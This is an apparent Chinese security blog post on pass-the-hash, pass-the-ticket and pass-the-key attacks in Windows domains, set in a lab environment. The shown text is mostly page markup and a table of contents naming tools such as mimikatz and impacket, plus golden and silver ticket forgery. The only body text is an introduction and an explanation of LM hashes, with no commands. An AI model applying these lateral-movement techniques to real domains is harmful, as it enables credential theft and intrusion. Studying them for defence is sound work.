<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"linus1124-root.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="网上也有很多关于pth&amp;ptt&amp;ptk的文章，这里仅作自己更深入理解">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析域渗透的pth&amp;ptt&amp;ptk">
<meta property="og:url" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/index.html">
<meta property="og:site_name" content="Linus1124">
<meta property="og:description" content="网上也有很多关于pth&amp;ptt&amp;ptk的文章，这里仅作自己更深入理解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307143037621.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307174851960.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175035435.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175628272.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307181533555.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201432638.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201809777.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308171935823.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308091716872.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308092612807.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093101883.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093949487.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308094634025.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095055606.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095431637.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095928239.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112450743.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112603791.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112720029.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143024538.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143635556.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308145841037.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150050482.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150718073.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151507846.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151818577.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152102520.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152322309.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152451407.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308153659219.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155430200.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155551146.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308162840622.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163401831.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163727221.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165539270.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165504698.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308170058648.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172118232.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172141266.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308173957253.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174152540.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174406051.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174434161.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174617592.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174630585.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308180406045.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181640529.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181726991.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181807973.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308184724417.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308185345321.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190455630.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308190515961.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191224922.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308191324307.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308192816206.png">
<meta property="og:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308193145797.png">
<meta property="article:published_time" content="2022-03-06T12:09:16.000Z">
<meta property="article:modified_time" content="2022-03-08T11:39:42.087Z">
<meta property="article:author" content="chen">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307143037621.png">


<link rel="canonical" href="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/","path":"2022/03/06/浅析域渗透的pth-ptt-ptk/","title":"浅析域渗透的pth&ptt&ptk"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>浅析域渗透的pth&ptt&ptk | Linus1124</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="Linus1124" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Linus1124</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Every little helps</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">2</span></a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PTH%EF%BC%9APass-The-Hash%EF%BC%88Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">PTH：Pass The Hash（Hash传递攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">PTH攻击的原理及条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTH%E7%9A%84%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">PTH的各种攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81mimikatz"><span class="nav-number">1.3.1.</span> <span class="nav-text">一、mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81msf%E7%9A%84pth"><span class="nav-number">1.3.2.</span> <span class="nav-text">二、msf的pth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81impacket%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">1.3.3.</span> <span class="nav-text">三、impacket工具包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81PTH%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">1.3.4.</span> <span class="nav-text">四、PTH工具包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81Crackmapexec"><span class="nav-number">1.3.5.</span> <span class="nav-text">五、Crackmapexec</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTT%EF%BC%9APass-The-Ticket%EF%BC%88Hash%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">PTT：Pass The Ticket（Hash票据传递）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="nav-number">2.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTT%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">PTT攻击的原理及条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTT%E7%9A%84%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">PTT的各种攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81MS14-068"><span class="nav-number">2.3.1.</span> <span class="nav-text">一、MS14-068</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81kekeo"><span class="nav-number">2.3.2.</span> <span class="nav-text">二、kekeo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81goldenpac"><span class="nav-number">2.3.3.</span> <span class="nav-text">三、goldenpac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8msf%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="nav-number">2.3.4.</span> <span class="nav-text">四、使用msf的模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">2.3.5.</span> <span class="nav-text">五、制作黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%88%B6%E4%BD%9C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0CIFS%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-number">2.3.6.</span> <span class="nav-text">六、制作白银票据伪造CIFS服务权限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PTK%EF%BC%9APass-The-Key%EF%BC%88%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">PTK：Pass The Key（密钥传递攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="nav-number">3.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTK%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.2.</span> <span class="nav-text">PTK攻击的原理及条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PTK%E7%9A%84%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-number">3.3.</span> <span class="nav-text">PTK的各种攻击手法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81mimikatz-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">一、mimikatz</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81impacket%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">3.3.2.</span> <span class="nav-text">二、impacket工具包</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="chen"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">chen</p>
  <div class="site-description" itemprop="description">安全菜鸟的博客</div>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Linus1124-root" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Linus1124-root" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:656113372@qq.com" title="E-Mail → mailto:656113372@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="chen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Linus1124">
      <meta itemprop="description" content="安全菜鸟的博客">
    </span>
    
    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="浅析域渗透的pth&ptt&ptk | Linus1124">
      <meta itemprop="description" content="网上也有很多关于pth&ptt&ptk的文章，这里仅作自己更深入理解">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          浅析域渗透的pth&ptt&ptk
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-03-06 20:09:16" itemprop="dateCreated datePublished" datetime="2022-03-06T20:09:16+08:00">2022-03-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-03-08 19:39:42" itemprop="dateModified" datetime="2022-03-08T19:39:42+08:00">2022-03-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>52 分钟</span>
    </span>
</div>

            <div class="post-description">网上也有很多关于pth&ptt&ptk的文章，这里仅作自己更深入理解</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>一直对这一块知识有点知其然不知其所以然的感觉，所以这里总结一下关于这三种手法的原理及其利用。文章是以红日7的靶机作为域环境来进行的实验，域成员为192.168.93.20，域控为192.168.93.30，纯粹为了方便。。。</p>
<h1 id="PTH：Pass-The-Hash（Hash传递攻击）"><a href="#PTH：Pass-The-Hash（Hash传递攻击）" class="headerlink" title="PTH：Pass The Hash（Hash传递攻击）"></a>PTH：Pass The Hash（Hash传递攻击）</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>什么是LM Hash？什么是NTLM Hash？和pth有什么关系？</p>
<p>LM Hash(LAN Manager Hash)：当windows用户设置密码后，会生成一个Hash值，windows会把这个Hash值保存到c:\windows\system32\config\sam，文件中，Lm Hash也就是生成这个Hash值的一种单向散列函数，所以我们登录计算机输入密码的时候，计算机不会把我们的明文密码拿去和保存的密码比对，而是将我们输入的密码的Hash值拿去比对，如果Hash值相同，才能登陆成功。</p>
